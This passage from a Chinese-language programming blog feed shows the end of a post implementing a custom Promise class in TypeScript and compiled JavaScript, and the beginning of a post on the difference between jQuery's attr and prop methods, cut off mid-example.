class="line">  <span class="comment">// 失败队列，在 then 时注入，resolve 时触发</span></span><br><span class="line">  <span class="keyword">private</span> _rejectedQueues: <span class="built_in">any</span> = [];</span><br><span class="line">  <span class="comment">// 成功队列，在 then 时注入，resolve 时触发</span></span><br><span class="line">  <span class="keyword">private</span> _fulfilledQueues: <span class="built_in">any</span> = [];</span><br><span class="line">  <span class="comment">// resovle 时执行的函数</span></span><br><span class="line">  <span class="keyword">private</span> _resolve = <span class="function"><span class="params">val</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> run = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>._status !== PENDING) <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">this</span>._status = FULFILLED;</span><br><span class="line">      <span class="comment">// 依次执行成功队列中的函数，并清空队列</span></span><br><span class="line">      <span class="keyword">const</span> runFulfilled = <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cb;</span><br><span class="line">        <span class="keyword">while</span> ((cb = <span class="keyword">this</span>._fulfilledQueues.shift())) &#123;</span><br><span class="line">          cb(value);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="comment">// 依次执行失败队列中的函数，并清空队列</span></span><br><span class="line">      <span class="keyword">const</span> runRejected = <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cb; </span><br><span class="line">        <span class="keyword">while</span> ((cb = <span class="keyword">this</span>._rejectedQueues.shift())) &#123;</span><br><span class="line">          cb(error);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * 如果resolve的参数为Promise对象，</span></span><br><span class="line"><span class="comment">       * 则必须等待该Promise对象状态改变后当前Promsie的状态才会改变</span></span><br><span class="line"><span class="comment">       * 且状态取决于参数Promsie对象的状态</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (val <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">        val.then(</span><br><span class="line">          value =&gt; &#123;</span><br><span class="line">            <span class="keyword">this</span>._value = value;</span><br><span class="line">            runFulfilled(value);</span><br><span class="line">          &#125;,</span><br><span class="line">          err =&gt; &#123;</span><br><span class="line">            <span class="keyword">this</span>._value = err;</span><br><span class="line">            runRejected(err);</span><br><span class="line">          &#125;</span><br><span class="line">        );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._value = val;</span><br><span class="line">        runFulfilled(val);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 异步调用</span></span><br><span class="line">    setTimeout(run);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// reject 时执行的函数</span></span><br><span class="line">  <span class="keyword">private</span> _reject = <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._status !== PENDING) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 依次执行失败队列中的函数，并清空队列</span></span><br><span class="line">    <span class="keyword">const</span> run = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>._status = REJECTED;</span><br><span class="line">      <span class="keyword">this</span>._value = err;</span><br><span class="line">      <span class="keyword">let</span> cb;</span><br><span class="line">      <span class="keyword">while</span> ((cb = <span class="keyword">this</span>._rejectedQueues.shift())) &#123;</span><br><span class="line">        cb(err);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 为了支持同步的Promise，这里采用异步调用</span></span><br><span class="line">    setTimeout(run);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// then 方法</span></span><br><span class="line">  then(onFulfilled?, onRejected?) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; _value, _status &#125; = <span class="keyword">this</span>;</span><br><span class="line">    <span class="comment">// 返回一个新的Promise对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">onFulfilledNext, onRejectedNext</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 封装一个成功时执行的函数</span></span><br><span class="line">      <span class="keyword">const</span> fulfilled = <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (!isFunction(onFulfilled)) &#123;</span><br><span class="line">            onFulfilledNext(value);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> res = onFulfilled(value);</span><br><span class="line">            <span class="keyword">if</span> (res <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">              <span class="comment">// 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调</span></span><br><span class="line">              res.then(onFulfilledNext, onRejectedNext);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数</span></span><br><span class="line">              onFulfilledNext(res);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          <span class="comment">// 如果函数执行出错，新的Promise对象的状态为失败</span></span><br><span class="line">          onRejectedNext(err);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 封装一个失败时执行的函数</span></span><br><span class="line">      <span class="keyword">const</span> rejected = <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (!isFunction(onRejected)) &#123;</span><br><span class="line">            onRejectedNext(error);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> res = onRejected(error);</span><br><span class="line">            <span class="keyword">if</span> (res <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">              <span class="comment">// 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调</span></span><br><span class="line">              res.then(onFulfilledNext, onRejectedNext);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数</span></span><br><span class="line">              onFulfilledNext(res);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          <span class="comment">// 如果函数执行出错，新的Promise对象的状态为失败</span></span><br><span class="line">          onRejectedNext(err);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (_status) &#123;</span><br><span class="line">        <span class="comment">// 当状态为pending时，将then方法回调函数加入执行队列等待执行</span></span><br><span class="line">        <span class="keyword">case</span> PENDING:</span><br><span class="line">          <span class="keyword">this</span>._fulfilledQueues.push(fulfilled);</span><br><span class="line">          <span class="keyword">this</span>._rejectedQueues.push(rejected);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 当状态已经改变时，立即执行对应的回调函数</span></span><br><span class="line">        <span class="keyword">case</span> FULFILLED:</span><br><span class="line">          fulfilled(_value);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> REJECTED:</span><br><span class="line">          rejected(_value);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// catch 方法</span></span><br><span class="line">  <span class="keyword">catch</span>(onRejected) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.then(<span class="literal">undefined</span>, onRejected);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// finally 方法</span></span><br><span class="line">  <span class="keyword">finally</span>(cb) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.then(</span><br><span class="line">      value =&gt; MyPromise.resolve(cb()).then(<span class="function"><span class="params">()</span> =&gt;</span> value),</span><br><span class="line">      reason =&gt;</span><br><span class="line">        MyPromise.resolve(cb()).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">throw</span> reason;</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 静态 resolve 方法</span></span><br><span class="line">  <span class="keyword">static</span> resolve(value) &#123;</span><br><span class="line">    <span class="comment">// 如果参数是MyPromise实例，直接返回这个实例</span></span><br><span class="line">    <span class="keyword">if</span> (value <span class="keyword">instanceof</span> MyPromise) <span class="keyword">return</span> value;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(value));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 静态 reject 方法</span></span><br><span class="line">  <span class="keyword">static</span> reject(value) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(value));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 静态 all 方法</span></span><br><span class="line">  <span class="keyword">static</span> all(list) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 返回值的集合</span></span><br><span class="line">      <span class="keyword">let</span> values = [];</span><br><span class="line">      <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> [i, p] of list.entries()) &#123;</span><br><span class="line">        <span class="comment">// 数组参数如果不是MyPromise实例，先调用MyPromise.resolve</span></span><br><span class="line">        <span class="keyword">this</span>.resolve(p).then(</span><br><span class="line">          res =&gt; &#123;</span><br><span class="line">            values[i] = res;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="comment">// 所有状态都变成fulfilled时返回的MyPromise状态就变成fulfilled</span></span><br><span class="line">            <span class="keyword">if</span> (count === list.length) resolve(values);</span><br><span class="line">          &#125;,</span><br><span class="line">          err =&gt; &#123;</span><br><span class="line">            <span class="comment">// 有一个被rejected时返回的MyPromise状态就变成rejected</span></span><br><span class="line">            reject(err);</span><br><span class="line">          &#125;</span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 添加静态race方法</span></span><br><span class="line">  <span class="keyword">static</span> race(list) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> p of list) &#123;</span><br><span class="line">        <span class="comment">// 只要有一个实例率先改变状态，新的MyPromise的状态就跟着改变</span></span><br><span class="line">        <span class="keyword">this</span>.resolve(p).then(</span><br><span class="line">          res =&gt; &#123;</span><br><span class="line">            resolve(res);</span><br><span class="line">          &#125;,</span><br><span class="line">          err =&gt; &#123;</span><br><span class="line">            reject(err);</span><br><span class="line">          &#125;</span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>具体实现（JavaScript）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isFunction = <span class="function"><span class="keyword">function</span> (<span class="params">variable</span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">typeof</span> variable === <span class="string">'function'</span>; &#125;;</span><br><span class="line"><span class="comment">// 定义Promise的三种状态常量</span></span><br><span class="line"><span class="keyword">var</span> PENDING = <span class="string">'pending'</span>;</span><br><span class="line"><span class="keyword">var</span> FULFILLED = <span class="string">'fulfilled'</span>;</span><br><span class="line"><span class="keyword">var</span> REJECTED = <span class="string">'rejected'</span>;</span><br><span class="line"><span class="keyword">var</span> MyPromise = <span class="comment">/** @class */</span> (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 构造函数，new 时触发</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MyPromise</span>(<span class="params">handle</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">        <span class="comment">// 状态 pending fulfilled rejected</span></span><br><span class="line">        <span class="keyword">this</span>._status = PENDING;</span><br><span class="line">        <span class="comment">// 储存 value，用于 then 返回</span></span><br><span class="line">        <span class="keyword">this</span>._value = <span class="literal">undefined</span>;</span><br><span class="line">        <span class="comment">// 失败队列，在 then 时注入，resolve 时触发</span></span><br><span class="line">        <span class="keyword">this</span>._rejectedQueues = [];</span><br><span class="line">        <span class="comment">// 成功队列，在 then 时注入，resolve 时触发</span></span><br><span class="line">        <span class="keyword">this</span>._fulfilledQueues = [];</span><br><span class="line">        <span class="comment">// resovle 时执行的函数</span></span><br><span class="line">        <span class="keyword">this</span>._resolve = <span class="function"><span class="keyword">function</span> (<span class="params">val</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (_this._status !== PENDING)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                _this._status = FULFILLED;</span><br><span class="line">                <span class="comment">// 依次执行成功队列中的函数，并清空队列</span></span><br><span class="line">                <span class="keyword">var</span> runFulfilled = <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> cb;</span><br><span class="line">                    <span class="keyword">while</span> ((cb = _this._fulfilledQueues.shift())) &#123;</span><br><span class="line">                        cb(value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">// 依次执行失败队列中的函数，并清空队列</span></span><br><span class="line">                <span class="keyword">var</span> runRejected = <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> cb;</span><br><span class="line">                    <span class="keyword">while</span> ((cb = _this._rejectedQueues.shift())) &#123;</span><br><span class="line">                        cb(error);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 如果resolve的参数为Promise对象，</span></span><br><span class="line"><span class="comment">                 * 则必须等待该Promise对象状态改变后当前Promsie的状态才会改变</span></span><br><span class="line"><span class="comment">                 * 且状态取决于参数Promsie对象的状态</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">if</span> (val <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                    val.then(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">                        _this._value = value;</span><br><span class="line">                        runFulfilled(value);</span><br><span class="line">                    &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">                        _this._value = err;</span><br><span class="line">                        runRejected(err);</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _this._value = val;</span><br><span class="line">                    runFulfilled(val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 异步调用</span></span><br><span class="line">            setTimeout(run);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// reject 时执行的函数</span></span><br><span class="line">        <span class="keyword">this</span>._reject = <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (_this._status !== PENDING)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">// 依次执行失败队列中的函数，并清空队列</span></span><br><span class="line">            <span class="keyword">var</span> run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                _this._status = REJECTED;</span><br><span class="line">                _this._value = err;</span><br><span class="line">                <span class="keyword">var</span> cb;</span><br><span class="line">                <span class="keyword">while</span> ((cb = _this._rejectedQueues.shift())) &#123;</span><br><span class="line">                    cb(err);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 为了支持同步的Promise，这里采用异步调用</span></span><br><span class="line">            setTimeout(run);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            handle(<span class="keyword">this</span>._resolve, <span class="keyword">this</span>._reject);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">this</span>._reject(err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// then 方法</span></span><br><span class="line">    MyPromise.prototype.then = <span class="function"><span class="keyword">function</span> (<span class="params">onFulfilled, onRejected</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">var</span> _a = <span class="keyword">this</span>, _value = _a._value, _status = _a._status;</span><br><span class="line">        <span class="comment">// 返回一个新的Promise对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="keyword">function</span> (<span class="params">onFulfilledNext, onRejectedNext</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 封装一个成功时执行的函数</span></span><br><span class="line">            <span class="keyword">var</span> fulfilled = <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!isFunction(onFulfilled)) &#123;</span><br><span class="line">                        onFulfilledNext(value);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">var</span> res = onFulfilled(value);</span><br><span class="line">                        <span class="keyword">if</span> (res <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                            <span class="comment">// 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调</span></span><br><span class="line">                            res.then(onFulfilledNext, onRejectedNext);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数</span></span><br><span class="line">                            onFulfilledNext(res);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                    <span class="comment">// 如果函数执行出错，新的Promise对象的状态为失败</span></span><br><span class="line">                    onRejectedNext(err);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 封装一个失败时执行的函数</span></span><br><span class="line">            <span class="keyword">var</span> rejected = <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!isFunction(onRejected)) &#123;</span><br><span class="line">                        onRejectedNext(error);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">var</span> res = onRejected(error);</span><br><span class="line">                        <span class="keyword">if</span> (res <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                            <span class="comment">// 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调</span></span><br><span class="line">                            res.then(onFulfilledNext, onRejectedNext);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数</span></span><br><span class="line">                            onFulfilledNext(res);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                    <span class="comment">// 如果函数执行出错，新的Promise对象的状态为失败</span></span><br><span class="line">                    onRejectedNext(err);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">switch</span> (_status) &#123;</span><br><span class="line">                <span class="comment">// 当状态为pending时，将then方法回调函数加入执行队列等待执行</span></span><br><span class="line">                <span class="keyword">case</span> PENDING:</span><br><span class="line">                    _this._fulfilledQueues.push(fulfilled);</span><br><span class="line">                    _this._rejectedQueues.push(rejected);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 当状态已经改变时，立即执行对应的回调函数</span></span><br><span class="line">                <span class="keyword">case</span> FULFILLED:</span><br><span class="line">                    fulfilled(_value);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> REJECTED:</span><br><span class="line">                    rejected(_value);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// catch 方法</span></span><br><span class="line">    MyPromise.prototype[<span class="string">"catch"</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">onRejected</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.then(<span class="literal">undefined</span>, onRejected);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// finally 方法</span></span><br><span class="line">    MyPromise.prototype[<span class="string">"finally"</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">cb</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.then(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123; <span class="keyword">return</span> MyPromise.resolve(cb()).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> value; &#125;); &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">reason</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> MyPromise.resolve(cb()).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> reason;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 静态 resolve 方法</span></span><br><span class="line">    MyPromise.resolve = <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 如果参数是MyPromise实例，直接返回这个实例</span></span><br><span class="line">        <span class="keyword">if</span> (value <span class="keyword">instanceof</span> MyPromise)</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123; <span class="keyword">return</span> resolve(value); &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 静态 reject 方法</span></span><br><span class="line">    MyPromise.reject = <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123; <span class="keyword">return</span> reject(value); &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 静态 all 方法</span></span><br><span class="line">    MyPromise.all = <span class="function"><span class="keyword">function</span> (<span class="params">list</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 返回值的集合</span></span><br><span class="line">            <span class="keyword">var</span> values = [];</span><br><span class="line">            <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">var</span> _loop_1 = <span class="function"><span class="keyword">function</span> (<span class="params">i, p</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 数组参数如果不是MyPromise实例，先调用MyPromise.resolve</span></span><br><span class="line">                _this.resolve(p).then(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                    values[i] = res;</span><br><span class="line">                    count++;</span><br><span class="line">                    <span class="comment">// 所有状态都变成fulfilled时返回的MyPromise状态就变成fulfilled</span></span><br><span class="line">                    <span class="keyword">if</span> (count === list.length)</span><br><span class="line">                        resolve(values);</span><br><span class="line">                &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="comment">// 有一个被rejected时返回的MyPromise状态就变成rejected</span></span><br><span class="line">                    reject(err);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _i = <span class="number">0</span>, _a = list.entries(); _i &lt; _a.length; _i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> _b = _a[_i], i = _b[<span class="number">0</span>], p = _b[<span class="number">1</span>];</span><br><span class="line">                _loop_1(i, p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 添加静态race方法</span></span><br><span class="line">    MyPromise.race = <span class="function"><span class="keyword">function</span> (<span class="params">list</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _i = <span class="number">0</span>, list_1 = list; _i &lt; list_1.length; _i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> p = list_1[_i];</span><br><span class="line">                <span class="comment">// 只要有一个实例率先改变状态，新的MyPromise的状态就跟着改变</span></span><br><span class="line">                _this.resolve(p).then(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                    resolve(res);</span><br><span class="line">                &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    reject(err);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> MyPromise;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Jquery中的属性获取</title>
    <url>/2018/03/17/Jquery%E4%B8%AD%E7%9A%84%E5%B1%9E%E6%80%A7%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;昨天做了一套题，发现自己jquery中好多东西都有点忘了。其中印象比较深的就是prop和attr的区别，当时就蒙逼了，prop感觉自己就没用过，只知道attr是获取属性，设置属性。回来就查了一些资料，下面就总结一下。</p>
<h1 id="1-手册上的说明"><a href="#1-手册上的说明" class="headerlink" title="1.手册上的说明"></a>1.手册上的说明</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">attr(attributeName)         <span class="comment">//获取第一个匹配元素的属性值</span></span><br><span class="line">attr(properties)   <span class="comment">//将一个“名/值”形式的对象设置为所有匹配元素的属性</span></span><br><span class="line">attr(key,value)    <span class="comment">//为所有匹配的元素设置一个属性</span></span><br><span class="line">attr(key,fn)       <span class="comment">//为所有匹配的元素设置一个计算属性</span></span><br><span class="line"></span><br><span class="line">prop(propertyName) <span class="comment">//获取匹配元素集中的第一个元素的属性值</span></span><br><span class="line">prop(key,value)    <span class="comment">//为所有匹配的元素设置一个属性</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>看了之后，就觉得除了感觉attr方法要多之外，就差不多。还有就是attributeName和propertyName有什么区别<br>官方文档上的说明是：具有 true 和 false 两个属性的属性，如 checked, selected 或者 disabled 使用prop()，其他的使用 attr()</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">"checkbox"</span> /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">'input'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            alert($(<span class="keyword">this</span>).attr(<span class="string">'checked'</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;  /</span><span class="regexp">/不管选中还是没选中都是undefined</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;input type="checkbox" /</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">'input'</span>).click(<span class="function"><span class="keyword">function</span>(<span 